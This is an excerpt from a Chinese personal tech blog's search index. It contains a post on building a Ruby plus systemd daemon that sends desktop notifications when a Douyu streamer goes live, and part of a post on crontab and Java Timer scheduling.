href=\"https://www.liaoxuefeng.com/wiki/896043488029600\">廖雪峰Git教程</a>，我按照他的教程过完一遍Git基本操作流程，还写过一篇博客。完全基于实战去解释Git的操作，感觉很适合没接触过Git的人看，他的教程算是我认为新手入门Git的最佳捷径。</li>\n</ul>\n<h2 id=\"存储\"><a href=\"#存储\" class=\"headerlink\" title=\"存储\"></a>存储</h2><p>张书宁，前华为存储的大佬。B站<a href=\"https://space.bilibili.com/299225769\">SunnyZhang的IT世界</a>，投稿大多涉及文件系统底层相关知识</p>\n<ul>\n<li><a href=\"bilibili.com/video/BV16P4y1s7ke/?spm_id_from=333.788.recommend_more_video.-1&amp;vd_source=7b12ced4d39cf756884de8d6e05af036\">《文件系统技术内幕》</a>系列，介绍了Linux文件系统相关原理</li>\n</ul>\n<p>知乎<a href=\"https://www.zhihu.com/people/zhang-shu-zhu-69\">itworld123</a>，《文件系统技术内幕》的作者在知乎的帐号，关注其专栏和回答</p>\n<ul>\n<li><a href=\"zhihu.com/column/c_1070639237568786432\">Linux文件系统彻底解析</a></li>\n<li><a href=\"https://www.zhihu.com/column/c_210330608\">数据存储技术</a></li>\n<li><a href=\"https://www.zhihu.com/column/c_1080796413692190720\">Linux内核开发从入门到精通</a></li>\n</ul>\n<h2 id=\"资源网\"><a href=\"#资源网\" class=\"headerlink\" title=\"资源网\"></a>资源网</h2><ul>\n<li><a href=\"https://www.52doc.com\">52doc</a></li>\n<li><a href=\"https://zlib.cc/book\">zlib.cc</a></li>\n</ul>\n","tags":["资源"]},{"title":"守护全世界最好的烤箱--systemd学习","url":"/2019/06/26/%E5%AE%88%E6%8A%A4%E5%85%A8%E4%B8%96%E7%95%8C%E6%9C%80%E5%A5%BD%E7%9A%84%E7%83%A4%E7%AE%B1-systemd%E5%AD%A6%E4%B9%A0/","content":"<blockquote>\n<p>不想开斗鱼APP推送，如何在pc端收到hanser直播的通知呢？本人是linux的深度使用者，这就需要写一个守护进程在后台监测了。</p>\n</blockquote>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>平时常用的mysql，httpd，nginx都是守护进程（daemon），可以被systemctl命令管理，例如<code>sudo systemctl start XXX</code>可以启动一个守护进程，<code>sudo systemctl stop XXX</code>则是关闭。</p>\n<p>本人环境Archlinux，arch已经从service迁移到了systemd，关于systemd资料如下</p>\n<ul>\n<li><a href=\"https://wiki.archlinux.org/index.php/Systemd/User#Writing_user_units\">ArchWiki的官方讲解</a></li>\n<li><a href=\"https://www.centos.bz/2018/03/systemd-%E7%BC%96%E5%86%99%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E8%84%9A%E6%9C%AC/\">systemd 编写服务管理脚本</a></li>\n<li><a href=\"https://www.centosdoc.com/system/201.html\">SYSTEMD启动脚本详解</a></li>\n</ul>\n<span id=\"more\"></span>\n<h2 id=\"编写脚本\"><a href=\"#编写脚本\" class=\"headerlink\" title=\"编写脚本\"></a>编写脚本</h2><p>首先需要写一个脚本，监听直播间的状态，因为刚刚学ruby，这里我选择ruby。<br>第一步就是找到包含直播间的状态api，但是网上关于斗鱼的api的介绍实在是太少了，我也没能分析出上百条xhr里哪个包含直播间状态，但是我发现斗鱼的友邻是可以看到在线状态的！于是迫不得已下只能用这个“骚”操作。</p>\n<p><img src=\"Screenshot_20190626_153719.png\" alt=\"\"></p>\n<p>这里用王菠萝的直播间做测试，房间号52004,这里的对应的api是<code>https://www.douyu.com/japi/anchorfriend/api/getAnchorFriends?rid=52004</code>，可以拿到友邻列表，其中hanser的数据如下：<br><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;hot&quot;</span>:<span class=\"number\">0</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;icon&quot;</span>:<span class=\"string\">&quot;https://apic.douyucdn.cn/upload/avanew/face/201707/13/12/060902aa06187ba0d0017fe6a25f8337_middle.jpg&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;isLive&quot;</span>:<span class=\"number\">0</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;isMutual&quot;</span>:<span class=\"number\">0</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;nickname&quot;</span>:<span class=\"string\">&quot;hanserLIVE&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;rid&quot;</span>:<span class=\"number\">2550505</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;roomTitle&quot;</span>:<span class=\"string\">&quot;hanser】礼拜一！&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;roomType&quot;</span>:<span class=\"number\">0</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;visit&quot;</span>:<span class=\"number\">0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>可以看出,isLive就是在线状态，所以只要让脚本监听这个字段就行了。</p>\n<p>Ruby代码：<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/ruby</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">&#x27;net/https&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">&#x27;uri&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">&#x27;json&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">&#x27;gir_ffi&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">=begin</span></span><br><span class=\"line\"><span class=\"comment\">斗鱼api的资料太少了，只能用友邻看状态这个骚操作来替代一下啦</span></span><br><span class=\"line\"><span class=\"comment\">=end</span></span><br><span class=\"line\"></span><br><span class=\"line\">GirFFI.setup <span class=\"symbol\">:Notify</span></span><br><span class=\"line\">Notify.init(<span class=\"string\">&quot;小天使开播了！&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#默认当前不在直播</span></span><br><span class=\"line\">curStatus = <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">puts <span class=\"string\">&#x27;starting...&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">true</span> <span class=\"keyword\">do</span></span><br><span class=\"line\">  uri = URI.parse(<span class=\"string\">&#x27;https://www.douyu.com/japi/anchorfriend/api/getAnchorFriends?rid=52004&#x27;</span>)</span><br><span class=\"line\">  res = Net::HTTP.post_form(uri,&#123;&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">  resbody = JSON.parse(res.body)</span><br><span class=\"line\">  list = resbody[<span class=\"string\">&quot;data&quot;</span>][<span class=\"string\">&quot;list&quot;</span>]</span><br><span class=\"line\">  hanser = list.filter&#123;<span class=\"params\">|zb|</span>zb[<span class=\"string\">&quot;rid&quot;</span>]==<span class=\"number\">2550505</span>&#125;[<span class=\"number\">0</span>]</span><br><span class=\"line\">  isLive = hanser[<span class=\"string\">&quot;isLive&quot;</span>]==<span class=\"number\">1</span></span><br><span class=\"line\">  roomTitle = hanser[<span class=\"string\">&quot;roomTitle&quot;</span>]</span><br><span class=\"line\">  puts <span class=\"string\">&#x27;hanser is live&#x27;</span> <span class=\"keyword\">if</span> isLive</span><br><span class=\"line\">  puts <span class=\"string\">&#x27;hanser is not live&#x27;</span> <span class=\"keyword\">if</span> !isLive</span><br><span class=\"line\">  <span class=\"keyword\">if</span> isLive!=curStatus <span class=\"keyword\">then</span> </span><br><span class=\"line\">    <span class=\"keyword\">if</span> isLive <span class=\"keyword\">then</span></span><br><span class=\"line\">      message = Notify::Notification.new(<span class=\"string\">&quot;小天使开播了！&quot;</span>, hanser[<span class=\"string\">&quot;roomTitle&quot;</span>], <span class=\"string\">&quot;dialog-information&quot;</span>)</span><br><span class=\"line\">      message.show</span><br><span class=\"line\">      curStatus = !curStatus</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      message = Notify::Notification.new(<span class=\"string\">&quot;小天使关播了&quot;</span>, hanser[<span class=\"string\">&quot;roomTitle&quot;</span>], <span class=\"string\">&quot;dialog-information&quot;</span>)</span><br><span class=\"line\">      message.show</span><br><span class=\"line\">      curStatus = !curStatus</span><br><span class=\"line\">    <span class=\"keyword\">end</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\">  sleep(<span class=\"number\">10</span>)</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure><br>这里用到了<code>gir_ffi</code>库，用来操作KDE的通知推送，要先安装<code>gem install gir_ffi</code>。每隔10s就请求一次，默认为非直播状态，检测到直播后/关播改变当前状态，防止不断的发送通知。</p>\n<p>ruby文件存为<code>main.rb</code>，编写启动脚本<code>wait-for-hanser.sh</code>,我们最后把文件放到/usr/share/hanser下，所以脚本如下：<br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">/etc/X11/xinit/xinitrc.d/50-systemd-user.sh</span><br><span class=\"line\">ruby -w /usr/share/hanser/main.rb</span><br></pre></td></tr></table></figure><br>其中<code>/etc/X11/xinit/xinitrc.d/50-systemd-user.sh</code>据说是archwiki上说用来设置X11环境的，我用了并没有什么用，但还是加上了。</p>\n<h2 id=\"编写systemd服务\"><a href=\"#编写systemd服务\" class=\"headerlink\" title=\"编写systemd服务\"></a>编写systemd服务</h2><p>接下来就是让该脚本作为一个守护进程持续运行了。</p>\n<p>创建<code>hanser.service</code>文件：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Hanser</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\">PartOf=graphical-session.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">User=xuranus</span><br><span class=\"line\">ExecStart=/usr/share/hanser/wait-for-hanser.sh</span><br><span class=\"line\">Environment=&quot;DISPLAY=:0&quot;</span><br><span class=\"line\">#Environment=&quot;XAUTHORITY=/tmp/xauth-1000-_0&quot;</span><br><span class=\"line\">Environment=&quot;DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus&quot;</span><br><span class=\"line\">Restart=always</span><br></pre></td></tr></table></figure><br><code>Description</code>填写服务介绍，因为该服务需要network.service，所以写在After后面。<code>ExecStart</code>写启动脚本，因为我在root不知道为何找不到gem环境，于是用我的用户xuranus运行，由于该进程要在X11环境先运行，所以要设置<code>$DISPLAY</code>和<code>$DBUS_SESSION_BUS_ADDRESS</code>环境变量。<code>Restart</code>设置为always因为脚本的脆弱性，容易崩，崩后可以迅速重启</p>\n<h2 id=\"安装和卸载\"><a href=\"#安装和卸载\" class=\"headerlink\" title=\"安装和卸载\"></a>安装和卸载</h2><p>INSTALL:<br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\">#echo &#x27;install ruby&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#sudo pacman -S ruby</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#echo &#x27;install gir_ffi&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#sudo gem install gir_ffi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;make directory /usr/share/hanser&#x27;</span></span><br><span class=\"line\">sudo mkdir /usr/share/hanser</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;create /usr/lib/systemed/system/hanser.service&#x27;</span></span><br><span class=\"line\">sudo cp hanser.service /usr/lib/systemd/system</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;create /usr/share/hanser/wait-for-hanser.sh&#x27;</span></span><br><span class=\"line\">sudo cp wait-for-hanser.sh /usr/share/hanser/wait-for-hanser.sh</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;create /usr/share/hanser/main.rb&#x27;</span></span><br><span class=\"line\">sudo cp main.rb /usr/share/hanser/main.rb</span><br><span class=\"line\"></span><br><span class=\"line\">sudo chmod +x /usr/share/hanser/main.rb</span><br><span class=\"line\">sudo chmod +x /usr/share/hanser/wait-for-hanser.sh</span><br><span class=\"line\"></span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;Done.&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p>UNINSTALL:<br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;uninstalling...&#x27;</span></span><br><span class=\"line\">sudo rm -rf /usr/share/hanser</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;stoping...&#x27;</span></span><br><span class=\"line\">sudo systemctl stop hanser</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;disabling....&#x27;</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">disable</span> hanser</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;removing service...&#x27;</span></span><br><span class=\"line\">sudo rm -rf /usr/lib/systemd/system/hanser.service</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;Done.&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p>只需要执行<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo ./INSTALL</span><br><span class=\"line\">sudo systemctl start hanser</span><br></pre></td></tr></table></figure><br><code>sudo systemctl status hanser</code> 可以看到服务已经成功跑起来了<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">● hanser.service - Hanser</span><br><span class=\"line\">   Loaded: loaded (/usr/lib/systemd/system/hanser.service; disabled; vendor preset: disabled)</span><br><span class=\"line\">   Active: active (running) since Wed 2019-06-26 11:37:47 CST; 4h 25min ago</span><br><span class=\"line\"> Main PID: 27735 (wait-for-hanser)</span><br><span class=\"line\">    Tasks: 4 (limit: 4915)</span><br><span class=\"line\">   Memory: 20.8M</span><br><span class=\"line\">   CGroup: /system.slice/hanser.service</span><br><span class=\"line\">           ├─27735 /bin/sh /usr/share/hanser/wait-for-hanser.sh</span><br><span class=\"line\">           └─27750 ruby -w /usr/share/hanser/main.rb</span><br><span class=\"line\"></span><br><span class=\"line\">Jun 26 14:08:11 Thanos wait-for-hanser.sh[27735]: hanser is not live</span><br></pre></td></tr></table></figure><br>设置成开机启动：<code>sudo systemctl enable hanser</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Created symlink /etc/systemd/system/multi-user.target.wants/hanser.service → /usr/lib/systemd/system/hanser.service.</span><br><span class=\"line\">Created symlink /etc/systemd/system/xsession.target.wants/hanser.service → /usr/lib/systemd/system/hanser.service.</span><br></pre></td></tr></table></figure><br>到9点了，看看效果</p>\n<p><img src=\"Screenshot_20190626_211037.png\" alt=\"\"></p>\n<p>再也不用担心错过小天使的直播辣！</p>\n","tags":["Linux"]},{"title":"定时任务的几种实现方式","url":"/2021/04/07/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%87%A0%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/","content":"<h2 id=\"crontab\"><a href=\"#crontab\" class=\"headerlink\" title=\"crontab\"></a>crontab</h2><p>Linux的crontab是系统自带的实现定时任务的模块，后台以守护进程的形式被<code>systemd</code>管理。crontab根据crontab表达式来配置一个定时任务，标准unix版本的crontab表达式是一个空格分割的5段字符串：<code>分 时 日 月 星</code>（分钟，小时，某日，某月，某年），一些其他的版本可能有7段：<code>秒 分 时 日 月 星 年</code>，此处以5段式表达式为准。</p>\n<p>基本用法：<code>crontab [-u user] &#123; -l | -r | -e &#125;</code>。<code>root</code>权限下<code>-u</code>可以指定他人的时程，不填默认设置自己的时程。</p>\n<ul>\n<li><code>-e</code> : 编辑器来设定时程表</li>\n<li><code>-r</code> : 删除目前的时程表</li>\n<li><code>-l</code> : 列出目前的时程表</li>\n</ul>\n<span id=\"more\"></span>\n<p><strong>crontab表达式</strong>：<br><code>分 时 日 月 星</code> 每一位取一个数字的时候，表示某一具体时间，各个域的取值范围为：</p>\n<ul>\n<li>分（Minute）：[0,59]的整数</li>\n<li>时（Hour）：[0,23]的整数</li>\n<li>日（DayOfMonth）：[0,31]的整数</li>\n<li>月（Month）:[1,12]的整数</li>\n<li>星（DayOfWeek）：[1,7]的整数（1是星期天，2是星期一）</li>\n</ul>\n<blockquote>\n<p>实际使用过程中可能因为操作系统版本不同导致取值范围不同，有的月份从0开始计数。为了屏蔽平台差异，建议使用：”JAN”,…,”DEC”等英文缩写表示月份，使用”SUN”,…,”SAT”表示星期几</p>\n</blockquote>\n<p>除了给每个域声明具体的值，还可以用以下四种字符表示多个时间点：</p>\n<ul>\n<li><code>,</code>：代表枚举，可以表示域内多个时间点</li>\n<li><code>*</code>：代表每一，匹配域内任意值</li>\n<li><code>-</code>：代表域内一个<strong>闭区间</strong>的连续取值</li>\n<li><code>n/m</code>：代表步长，从<code>n</code>开始取值，每次步长<code>m</code>，取遍域内所有合法的值</li>\n<li><code>nL</code>：表示最后，如DayOfWeek域使用<code>5L</code>,意味着在最后的一个星期四触发</li>\n<li><code>W</code>：表示有效工作日(周一到周五),只能出现在DayofMonth域。例如：在 DayofMonth使用<code>5W</code>：如果5日是星期六，则将在最近的工作日：星期五，即4日触发。如果5日是星期天，则在6日(周一)触发；如果5日在星期一到星期五中的一天，则就在5日触发。另外一点，W的最近寻找不会跨过月份</li>\n<li><code>LW</code>：表示在某个月最后一个工作日（某月最后一个周五）</li>\n<li><code>#</code>：用于确定每个月第几个星期几，只能出现在DayofMonth域。例如在<code>4#2</code>，表示某月的第二个星期三。</li>\n<li><code>?</code>：只能用在DayofMonth和DayofWeek两个域，用于协调配置的冲突</li>\n</ul>\n<p>例：</p>\n<ul>\n<li><code>11 4 5 1 ?</code>：1月5日04:11执行</li>\n<li><code>11 * 4 5 ?</code>：1月5日每小时11分执行</li>\n<li><code>* * * * *</code>：每分钟执行</li>\n<li><code>11/4 5 1 4 ?</code>：4月1日05:11，05:15，05:19，….，05:59执行</li>\n<li><code>11,4 5 1 4 ?</code>：4月1日05:04，05:11执行</li>\n<li><code>0 12 ? * WED</code>：每个星期三中午12点 </li>\n</ul>\n<p>以ubuntu为例子，<code>crontab -l</code>查看当前定时任务配置：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># For example, you can run a backup of all your user accounts</span></span><br><span class=\"line\"><span class=\"comment\"># at 5 a.m every week with:</span></span><br><span class=\"line\"><span class=\"comment\"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># m h  dom mon dow   command</span></span><br></pre></td></tr></table></figure><br>看到<code>m h dom mon dow</code>说明只支持标准的5段crontab表达式，表达式后直接写命令。写一个“每日凌晨删除十天前日志文件”的定时任务，<code>crontab -e</code>，选择一个编辑器，在末尾写入：<code>0 0 * * * find /var/log -ctime +10 -print0 | xargs -0 rm</code>，保存退出后显示<code>crontab: installing new crontab</code>说明新的定时任务开始配置。如果想立刻启动新的定时任务，可以直接重启<code>cron</code>服务：<code>sudo systemctl restart cron</code>。</p>\n<p>如果定时任务需要设置用户的环境变量，可以<code>* * * * * . /etc/profile; /usr/bin/bash script.sh</code>。如果定时任务需要<code>root</code>权限，可以用<code>root</code>用户设置<code>root</code>的时程：<code>sudo crontab -u root -e</code></p>\n<h2 id=\"Timer\"><a href=\"#Timer\" class=\"headerlink\" title=\"Timer\"></a>Timer</h2><p><code>Timer</code>是JDK自带的定时任务类，需要配合<code>TimerTask</code>一起使用。一个简单的定时任务Demo如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;main thread id = &quot;</span> + Thread.currentThread().getId());</span><br><span class=\"line\">    Timer timer = <span class=\"keyword\">new</span> Timer();</span><br><span class=\"line\"></span><br><span class=\"line\">    TimerTask timerTask1 = <span class=\"keyword\">new</span> TimerTask() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task1 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    TimerTask timerTask2 = <span class=\"keyword\">new</span> TimerTask() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task2 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    System.out.printf(<span class=\"string\">&quot;Timer ready to schedule, time = %s \\n&quot;</span>,<span class=\"keyword\">new</span> Date().toString());</span><br><span class=\"line\">    timer.schedule(timerTask1,<span class=\"number\">1000</span>,<span class=\"number\">1000</span>);</span><br><span class=\"line\">    timer.schedule(timerTask2,<span class=\"number\">1000</span>,<span class=\"number\">1000</span>);</span><br><span class=\"line\">    System.out.printf(<span class=\"string\">&quot;Timer doesn&#x27;t block main thread, time = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>每个<code>TimerTask</code>中实现<code>Runnable</code>接口，然后由<code>Timer</code>对象使用<code>schedule()</code>方法将任务加入定时任务队列，这里指定<code>timerTask</code>和<code>timerTask2</code>在1s后开始执行，每隔1s执行一次。执行的控制台结果如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">main thread id = 1</span><br><span class=\"line\">Timer ready to schedule, time = Wed Apr 14 14:36:54 CST 2021 </span><br><span class=\"line\">Timer doesn&#x27;t block main thread, time = Wed Apr 14 14:36:54 CST 2021 </span><br><span class=\"line\">Task1 start, time = Wed Apr 14 14:36:55 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 14:36:55 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 14:36:56 CST 2021, thread id = 12 </span><br><span class=\"line\">Task1 start, time = Wed Apr 14 14:36:56 CST 2021, thread id = 12 </span><br><span class=\"line\">Task1 start, time = Wed Apr 14 14:36:57 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 14:36:57 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 14:36:58 CST 2021, thread id = 12 </span><br><span class=\"line\">Task1 start, time = Wed Apr 14 14:36:58 CST 2021, thread id = 12 </span><br><span class=\"line\">Task1 start, time = Wed Apr 14 14:36:59 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 14:36:59 CST 2021, thread id = 12 </span><br></pre></td></tr></table></figure><br>由于每个任务都打印出了线程号和开始时间，可以看到每个<code>TimerTask</code>任务按照我们的预期的设定，严格按照每1s执行一次的设定。其中<code>main</code>函数线程ID是1，而同一个<code>Timer</code>调度的<code>TimerTask</code>的线程ID都是12。</p>\n<p>这是因为<code>Timer</code>本身是一个单线程的调度器，每个<code>Timer</code>对象中维护一个继承自<code>Thread</code>的<code>TimerThread</code>类的对象，和一个<code>TimerTask</code>类型的队列。当<code>Timer</code>被实例化，该线程就启动了，他将检查<code>Timer</code>中的<code>TimerTask</code>队列中的时间和当前系统时间，定时执行<code>run()</code>方法中的业务逻辑。而<code>Timer</code>的<code>schedule()</code>方法只是设置<code>TimerTask</code>的执行时间间隔和开始执行时间，讲<code>TimerTask</code>对象加入<code>Timer</code>中的任务队列，该方法不会阻塞线程。</p>\n<p>以上案例是<code>Timer</code>在比较理想的情况下的表现，当一个<code>TimerTask</code>执行的时间较长，由于<code>Timer</code>只维护了一个<code>TimerThread</code>线程，执行时间较长的<code>TimerTask</code>会阻塞其他的<code>TimerTask</code>，造成每个<code>TimerTask</code>执行的间隔时间与预期不一致：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;main thread id = &quot;</span> + Thread.currentThread().getId());</span><br><span class=\"line\">    Timer timer = <span class=\"keyword\">new</span> Timer();</span><br><span class=\"line\"></span><br><span class=\"line\">    TimerTask timerTask1 = <span class=\"keyword\">new</span> TimerTask() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task1 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TimeUnit.SECONDS.sleep(<span class=\"number\">4</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task1 finished, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    TimerTask timerTask2 = <span class=\"keyword\">new</span> TimerTask() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task2 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TTimeUnit.SECONDS.sleep(<span class=\"number\">3</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task2 finished, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    System.out.printf(<span class=\"string\">&quot;Timer ready to schedule, time = %s \\n&quot;</span>,<span class=\"keyword\">new</span> Date().toString());</span><br><span class=\"line\">    timer.schedule(timerTask1,<span class=\"number\">1000</span>,<span class=\"number\">1000</span>);</span><br><span class=\"line\">    timer.schedule(timerTask2,<span class=\"number\">1000</span>,<span class=\"number\">1000</span>);</span><br><span class=\"line\">    System.out.printf(<span class=\"string\">&quot;Timer doesn&#x27;t block main thread, time = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>让<code>TimerTask1</code>执行时间达到3s，<code>TimerTask2</code>执行时间达到4s，依旧设置每1s执行一次，输出如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">main thread id = 1</span><br><span class=\"line\">Timer ready to schedule, time = Wed Apr 14 15:31:15 CST 2021 </span><br><span class=\"line\">Timer doesn&#x27;t block main thread, time = Wed Apr 14 15:31:15 CST 2021 </span><br><span class=\"line\">Task1 start, time = Wed Apr 14 15:31:16 CST 2021, thread id = 12 </span><br><span class=\"line\">Task1 finished, time = Wed Apr 14 15:31:20 CST 2021, thread id = 12 